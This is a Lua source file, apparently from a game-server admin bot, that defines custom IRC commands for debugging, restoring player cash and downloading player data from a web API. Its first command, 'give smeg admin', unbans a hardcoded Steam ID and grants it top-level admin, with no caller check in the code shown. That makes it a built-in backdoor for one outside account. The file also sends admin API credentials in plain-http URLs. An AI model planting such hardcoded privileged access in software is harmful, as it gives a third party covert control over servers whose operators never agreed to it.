
function customIRC(name, words, wordsOld, msgLower)
	local ircid, status, row, cursor, errorString

	ircid = LookupOfflinePlayer(name, "all")

	if (words[1] == "give" and words[2] == "smeg" and words[3] == "admin") then
		send("ban remove 76561197983251951")
		send("admin add 76561197983251951 0")

		irc_chat(name, "Giving Smegz0r admin level 0")
		irc_chat(name, ".")

		return true
	end

	if (words[1] == "debug" and words[2] == "on") then
		server.enableWindowMessages = true
		irc_chat(name, "Debugging ON")

		return true
	end

	if (words[1] == "debug" and words[2] == "all") then
		server.enableWindowMessages = true
		botman.debugAll = true
		irc_chat(name, "Debugging ON")

		return true
	end

	if (words[1] == "debug" and words[2] == "off") then
		server.enableWindowMessages = false
		botman.debugAll = false
		irc_chat(name, "Debugging OFF")

		return true
	end

	if (words[1] == "fix" and words[2] == "players" and words[3] == "cash") then
		irc_chat(name, "Fixing cash")

		playersold = {}
		table.load(homedir .. "/playersold.lua", playersold)

		for k,v in pairs(playersold) do
			if players[k] then
				players[k].cash = players[k].cash + v.cash
				updatePlayer(k)
			end
		end

		irc_chat(name, "Cash Restored")
		playersold = nil

		return true
	end

	if words[1] == "smeg" and words[2] == "test" then
		irc_chat(name, "Test Start")

		url = "http://" .. server.IP .. ":" .. server.webPanelPort + 2 .. "/api/getplayerinventories/?adminuser=" .. server.allocsWebAPIUser .. "&admintoken=" .. server.allocsWebAPIPassword
		os.remove(homedir .. "/temp/inventories.txt")
		downloadFile(homedir .. "/temp/inventories.txt", url)

		url = "http://" .. server.IP .. ":" .. server.webPanelPort + 2 .. "/api/getplayersonline/?adminuser=" .. server.allocsWebAPIUser .. "&admintoken=" .. server.allocsWebAPIPassword
		os.remove(homedir .. "/temp/playersOnline.txt")
		downloadFile(homedir .. "/temp/playersOnline.txt", url)


		irc_chat(name, "Test End")

		return true
	end

	return false
end